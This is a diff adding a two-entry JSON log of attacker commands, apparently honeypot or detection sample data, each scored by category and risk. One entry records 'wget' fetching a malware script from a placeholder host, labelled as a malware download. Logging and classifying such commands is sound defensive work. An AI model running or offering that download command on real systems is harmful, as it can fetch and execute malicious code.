@@ -1,0 +1,16 @@
+[
+  {
+    "timestamp": "2026-01-31T06:29:58Z",
+    "src_ip": "10.0.2.15",
+    "category": "RECON",
+    "command": "whoami",
+    "risk": 2
+  },
+  {
+    "timestamp": "2026-01-31T06:31:12Z",
+    "src_ip": "10.0.2.15",
+    "category": "MALWARE_DOWNLOAD",
+    "command": "wget http://example.com/malware.sh",
+    "risk": 8
+  }
+]
